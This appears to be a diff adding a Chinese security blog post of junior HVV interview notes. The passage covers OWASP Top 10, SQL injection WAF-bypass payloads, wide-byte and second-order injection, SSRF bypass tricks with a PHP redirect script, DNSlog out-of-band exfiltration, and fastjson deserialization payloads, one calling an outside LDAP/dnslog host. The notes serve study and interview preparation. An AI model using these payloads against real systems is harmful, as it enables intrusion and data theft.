@@ -1,0 +1,2053 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="hvv初级面试总结, n0rt6&#39;s bolg">
+    <meta name="description" content="本网站是个人兴趣爱好，总结分享经验，记录生活点滴的平台，希望在以后的学习旅途中，走出自己的风景。">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>hvv初级面试总结 | n0rt6&#39;s bolg</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+   <style>
+    body{
+       background-image: url(https://pic.3gbizhi.com/2020/0928/thumb_1680_0_20200928110057948.jpg);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    
+        <div id="loading-container">
+             <p class="loading-text">嘘~  正在从服务器偷取页面 . . . </p> 
+             <div class="loading-image">
+                 <div></div>
+                 <div></div>
+                 <div></div>
+                 <div></div> 
+                 <div></div>
+             </div>
+        </div>
+    
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">n0rt6&#39;s bolg</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">n0rt6&#39;s bolg</div>
+        <div class="logo-desc">
+            
+            本网站是个人兴趣爱好，总结分享经验，记录生活点滴的平台，希望在以后的学习旅途中，走出自己的风景。
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/3143047748/3143047748.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/3143047748/3143047748.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '218abce34b8cbb107c949ae525114d48c6de4377019eb6098a9a0e9c5894f652';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，去找博主要密码吧！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">hvv初级面试总结</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+        background-color: rgb(255, 255, 255,0.7);
+        border-radius: 10px;
+        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/hvv/" class="post-category">
+                                hvv
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-06-20
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-07-22
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    9.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    33 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <meta name="referrer" content="no-referrer"/>
+
+<h2 id="OWASP-Top10有哪些漏洞"><a href="#OWASP-Top10有哪些漏洞" class="headerlink" title="OWASP Top10有哪些漏洞"></a>OWASP Top10有哪些漏洞</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">SQL</span>注入
+失效的身份认证
+敏感数据泄露
+<span class="token constant">XML</span>外部实体（<span class="token constant">XXE</span>）
+失效的访问控制
+安全配置错误
+跨站脚本（<span class="token constant">XSS</span>）
+不安全的反序列化
+使用含有已知漏洞的组件
+不足的日志记录和监控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="常见数据库默认端口"><a href="#常见数据库默认端口" class="headerlink" title="常见数据库默认端口"></a>常见数据库默认端口</h2><p>MySql：3306</p>
+<p>Oracle：1521</p>
+<p>Redis：6379</p>
+<p>Mssql：1433    &#x2F;&#x2F;全称：Microsoft SQL Server</p>
+<p>PostgreSQL：5432</p>
+<p><strong>但在实际使用中可能会根据需要进行修改</strong></p>
+<h2 id="SQL注入的流量分析"><a href="#SQL注入的流量分析" class="headerlink" title="SQL注入的流量分析"></a>SQL注入的流量分析</h2><p>通过日志查看攻击者输入的字段。一般在用户密码登录时攻击者会注入恶意SQL语句，如果网站不对用户输入的内容 进行限制，极易出现对网站的破坏。</p>
+<p>union ,select ，sleep 等敏感字符。</p>
+<h2 id="常见SQL注入绕过"><a href="#常见SQL注入绕过" class="headerlink" title="常见SQL注入绕过"></a>常见SQL注入绕过</h2><p><strong>SQL注入大小写绕过：</strong></p>
+<p>通过将语句大小写更改，进行绕过。（这种情况通常出现在WAF对打小写没有过滤的情况下）</p>
+<pre class="line-numbers language-none"><code class="language-none">UniOn AND 1 &#x3D; 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>SQL注入注释符绕过:</strong></p>
+<p>通过添加注释符对语句内容进行绕</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;*绕过的内容*&#x2F;select user,password from &#x2F;**&#x2F;users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>SQL注入空格绕过</strong></p>
+<p>通过添加空格的URL编码进入绕过</p>
+<pre class="line-numbers language-none"><code class="language-none">空格的URL编码%20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>SQL注入引号绕过</strong></p>
+<p>使用到引号的地方一般在语句中，像where语句，这条语句意识就是用来查得到users表中所有字段</p>
+<pre class="line-numbers language-none"><code class="language-none">select column_name from information_schema.tables where table_name&#x3D;&quot;users&quot;select column_name from information_schema.tables where table_name&#x3D;&quot;text&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><strong>SQL注入十六进制绕过</strong></p>
+<p>当引号绕过方法被过滤的情况下，还可以利用进制进行绕过。</p>
+<pre class="line-numbers language-none"><code class="language-none">将users转换为十六进制进行绕过select column_name from information_schema.tables where table_name&#x3D;0x7573657273<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><strong>SQL注入from for语句绕过</strong></p>
+<p>当进行SQL盲注会用到，<code>substr()</code> ,<code>mid()</code> ,<code>limit</code>。这些句子方法都需要用到逗号。对于<code>substr()</code> ,<code>mid()</code> 句子可以直接利用from for句子进行绕过。</p>
+<pre class="line-numbers language-none"><code class="language-none">单引号绕过，与from for绕过 select substr(database() from 1 for 1)&#x3D;&#39;tyaq&#39;; select mid(database() from 1 for 1)&#x3D;&#39;tyaq&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><strong>SQL注入比较符绕过&lt;&gt;</strong></p>
+<p>sql盲注,使用二分查找时需要使用到比较符来进行。</p>
+<pre class="line-numbers language-none"><code class="language-none">select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;88<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><strong>SQL注入greatest绕过</strong></p>
+<p>当比较符被系统过滤了，比较符盲注语句无法使用时，可以使用greatest来代替比较操作符。<code>greatest(n1,n2,n3,n4等)</code>函数返回输入参数<code>(n1,n2,n3,n4等)</code>的最大值。</p>
+<p>sql语句可以使用greatest变为ascii码值进行大小爆破</p>
+<pre class="line-numbers language-none"><code class="language-none">select * from cms_users where userid&#x3D;1 and greatest(ascii(substr(database(),1,1)),1)&#x3D;88;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>SQL注入编码绕过</strong></p>
+<p>URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<pre class="line-numbers language-none"><code class="language-none">ASCII码绕过Test 等价于CHAR(55)+CHAR(66)+CHAR(88)+CHAR(99)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>对关键字进行URL编码绕过</p>
+<pre class="line-numbers language-none"><code class="language-none">URL编码转换绕过1+and+1&#x3D;11+%25%36%31%25%36%65%25%36%34+1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>16进制编码转换绕过</p>
+<pre class="line-numbers language-none"><code class="language-none">将users转换为十六进制进行绕过select column_name from information_schema.tables where table_name&#x3D;users;select column_name from information_schema.tables where table_name&#x3D;0x7573657273;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>SQL注入内联注释绕过</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">内联注释就是把一些特有的仅在MYSQL上的语句放在 &#x2F;!..&#x2F; 中，这些语句如果在其它数据库中是不会被执行而在SQL数据库中可被执行 select * from cms_users where userid&#x3D;1 union &#x2F;*!select*&#x2F; 1,2,3;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="sql注入过滤"><a href="#sql注入过滤" class="headerlink" title="sql注入过滤"></a>sql注入过滤</h2><ol>
+<li><strong>使用参数化查询</strong>：参数化查询可以将用户输入和SQL代码分开，从而避免SQL注入攻击。通过使用预编译语句和参数化查询语句，应用程序可以把用户输入转化为参数，而不是直接拼接到SQL语句中。</li>
+<li><strong>对输入进行过滤和验证</strong>：在应用程序中对输入数据进行过滤和验证，可以有效地减少SQL注入攻击的风险。可以使用白名单或黑名单机制，过滤掉非法字符或语句，或者对输入数据进行格式验证和长度限制。</li>
+<li><strong>使用ORM框架</strong>：使用ORM框架可以避免手动拼接SQL语句，从而减少SQL注入攻击的风险。ORM框架可以自动将数据转换为参数，从而防止恶意SQL注入攻击。</li>
+<li><strong>使用防火墙</strong>：使用Web应用程序防火墙可以监测和防止SQL注入攻击。防火墙可以对输入数据进行检查，过滤掉恶意SQL语句，从而保护应用程序不受攻击。</li>
+</ol>
+<h2 id="Sql注入分类"><a href="#Sql注入分类" class="headerlink" title="Sql注入分类"></a>Sql注入分类</h2><p>报错注入、盲注、时间盲注、二次注入，宽字节,堆叠注入，http header的注入，xff，cookie注入</p>
+<h3 id="宽字节注入条件"><a href="#宽字节注入条件" class="headerlink" title="宽字节注入条件"></a><strong>宽字节注入条件</strong></h3><p>1.数据库为GBK编码<br> 2.使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符  \  进行转义</p>
+<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a><strong>绕过方式</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root %df' or <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span>
+<span class="token comment"># 原理:在GBK编码中,反斜杠的编码是%5c,在输入%df后，使得添加反斜杠后形成%df%5c，而%df%5c是繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="SQL二次注入"><a href="#SQL二次注入" class="headerlink" title="SQL二次注入"></a>SQL二次注入</h2><p>二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p>
+<h2 id="SQL报错注入"><a href="#SQL报错注入" class="headerlink" title="SQL报错注入"></a>SQL报错注入</h2><p>函数：</p>
+<p>floor()函数，</p>
+<p>exp()函数，</p>
+<p>convert()函数，</p>
+<p>updataxml()函数，返回数据长度&lt;32位</p>
+<p>name_const()函数，</p>
+<p>extractvalue()函数：返回数据长度&lt;32位</p>
+<h2 id="XXE漏洞（即XMl外部实体注入漏洞）"><a href="#XXE漏洞（即XMl外部实体注入漏洞）" class="headerlink" title="XXE漏洞（即XMl外部实体注入漏洞）"></a>XXE漏洞（即XMl外部实体注入漏洞）</h2><p><strong>XXE</strong>漏洞触发点往往是可以上传xml文件的位置，没有对xml文件进行过滤，导致可加载恶意外部文件和代码，造成任意文件读取，命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害</p>
+<h2 id="怎么判断网站是否存在XXE漏洞"><a href="#怎么判断网站是否存在XXE漏洞" class="headerlink" title="怎么判断网站是否存在XXE漏洞"></a>怎么判断网站是否存在XXE漏洞</h2><p>最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞</p>
+<h2 id="CSRF攻击原理"><a href="#CSRF攻击原理" class="headerlink" title="CSRF攻击原理"></a>CSRF攻击原理</h2><p><img src="https://pic1.zhimg.com/80/v2-74875be6a3bcbd97e58dc00d86f571e0_1440w.webp" alt="123"></p>
+<ol>
+<li>用户输入账号信息请求登录A网站。</li>
+<li>A网站验证用户信息，通过验证后返回给用户一个cookie</li>
+<li>在未退出网站A之前，在同一浏览器中请求了黑客构造的恶意网站B</li>
+<li>B网站收到用户请求后返回攻击性代码，构造访问A网站的语句</li>
+<li>浏览器收到攻击性代码后，在用户不知情的情况下携带cookie信息请求了A网站。此时A网站不知道这是由B发起的。那么这时黑客就可以进行一下骚操作了！</li>
+</ol>
+<p>两个条件：a 用户访问站点A并产生了cookie</p>
+<p>b 用户没有退出A同时访问了B</p>
+<h2 id="SSRF漏洞（服务器端请求伪造）"><a href="#SSRF漏洞（服务器端请求伪造）" class="headerlink" title="SSRF漏洞（服务器端请求伪造）"></a>SSRF漏洞（服务器端请求伪造）</h2><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
+<p>从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
+<p>利用的是服务端的请求伪造。</p>
+<p>SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
+<h3 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h3><p><strong>1.@符号绕过：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.xxx.com@www.kxsy.work&#x2F;
+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>在某地址1后添加@再次添加地址2，浏览器会自动返回地址2数据</p>
+<p><strong>2.IP地址转换：</strong></p>
+<p>对内网请求的IP地址进行各进制的编码</p>
+<p><strong>3.转换短网址：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.985.so&#x2F;
+例：http:&#x2F;&#x2F;www.kxsy.work&#x2F; &#x3D; http:&#x2F;&#x2F;u6.gg&#x2F;ks69x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><strong>4.特殊符号替换绕过：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">例：
+http:&#x2F;&#x2F;www.kxsy.work&#x2F; &#x3D; http:&#x2F;&#x2F;www。kxsy。work&#x2F;
+localhost或者0.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>5.302跳转绕过：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php  
+$schema &#x3D; $_GET[&#39;s&#39;];
+$ip     &#x3D; $_GET[&#39;i&#39;];
+$port   &#x3D; $_GET[&#39;p&#39;];
+$query  &#x3D; $_GET[&#39;q&#39;];
+if(empty($port))&#123;  
+    header(&quot;Location: $schema:&#x2F;&#x2F;$ip&#x2F;$query&quot;); 
+&#125; else &#123;
+    header(&quot;Location: $schema:&#x2F;&#x2F;$ip:$port&#x2F;$query&quot;); 
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>6.xip.io绕过：会将解析到子域</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.0.0.1.xip.io &#x3D; 10.0.0.1
+www.10.0.0.1.xip.io&#x3D; 10.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><strong>8.其他协议绕过 ：</strong></p>
+<p>配合File、 GOPHER等协议的对目标进行信息探测</p>
+<h2 id="XSS（跨站点脚本攻击）"><a href="#XSS（跨站点脚本攻击）" class="headerlink" title="XSS（跨站点脚本攻击）"></a>XSS（跨站点脚本攻击）</h2><p>服务器对用户提交的数据过滤不严，导致浏览器把用户的输入当成了JS代码并直接返回给客户端执行，从而实现<strong>对客户端的攻击</strong>目的。</p>
+<p>反射型XSS</p>
+<p>存储型XSS</p>
+<p>DOM型XSS：DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p>
+<h2 id="xss与csrf的区别"><a href="#xss与csrf的区别" class="headerlink" title="xss与csrf的区别"></a>xss与csrf的区别</h2><p>**xss：跨站脚本攻击、诱骗用户点击恶意链接盗取用户cookie进行攻击、不需要用户进行登录、xss除了利用cookie还可以篡改网页等. **</p>
+<p><strong>csrf：跨站请求伪造、无法获取用户的cookie而是直接冒充用户、需要用户登录后进行操作</strong></p>
+<h2 id="哪里使用到了dnslog外带"><a href="#哪里使用到了dnslog外带" class="headerlink" title="哪里使用到了dnslog外带"></a>哪里使用到了dnslog外带</h2><h3 id="DNSlog外带原理："><a href="#DNSlog外带原理：" class="headerlink" title="DNSlog外带原理："></a>DNSlog外带原理：</h3><p>DNS在解析的时候会留下日志，我们将信息放在高级域名中，传递到自己这里，然后通过读日志获取信息。</p>
+<h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><p>盲注需要频繁请求才能获取数据库中的值，在有waf的情况下很容易被ban ip。这种情况下可以结合DNSLog将数据取出。<strong>如果遇到MySQL的盲注，可以利用内置函数load_file()来完成DNSLog。load_file()不仅能够加载本地文件，同时也能对诸如<code>www.baidu.com</code>这样的url发起请求</strong></p>
+<h3 id="无回显的SSRF"><a href="#无回显的SSRF" class="headerlink" title="无回显的SSRF"></a>无回显的SSRF</h3><p>将url换成我们的DNS服务器，通过查看DNSLog平台日志查看是否有服务器ip判断是否有ssrf漏洞</p>
+<h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p>xss盲打是指在攻击者对数据提交后展现的后台未知的情况下，网站采用了攻击者插入的带有真实攻击行为的xss代码数据。当未知后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发xss来实现攻击者预定好的真实攻击功能。</p>
+<h3 id="log4j漏洞"><a href="#log4j漏洞" class="headerlink" title="log4j漏洞"></a>log4j漏洞</h3><h3 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h3><p>构造以下payload（content-type字段为application&#x2F;json），利用dnslog平台接收：{“zeo”:{“@type”:”java.net.Inet4Address”,”val”:”ntel8h.dnslog.cn”}}（不同版本，payload不同。推荐这种方式）</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;
+    &quot;b&quot;:&#123;
+        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;ntel8h.dnslog.cn&#x2F;test&quot;,
+        &quot;autoCommit&quot;:true
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
